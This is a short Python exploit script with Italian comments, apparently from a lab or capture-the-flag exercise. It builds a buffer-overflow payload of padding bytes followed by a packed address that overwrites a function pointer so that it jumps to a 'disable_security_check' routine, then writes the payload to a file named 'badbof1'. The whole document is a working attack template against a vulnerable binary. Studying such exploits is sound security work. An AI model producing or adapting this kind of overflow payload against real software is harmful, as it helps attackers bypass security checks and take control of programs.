import struct

disable_addr = 0x804852b
dist_canary_dst = 100
dist_fp_str = 263

#faccio puntare fp a disable_security_check
atk_vector = 'A' * dist_canary_dst
#da 116 ora devo passare a sovrascrivere fp
atk_vector += 'A' * (dist_fp_str-len(atk_vector))#263
print(len(atk_vector))
atk_vector += struct.pack("I", disable_addr) #267


f = open("badbof1", "w+")
f.write(atk_vector)
f.close()
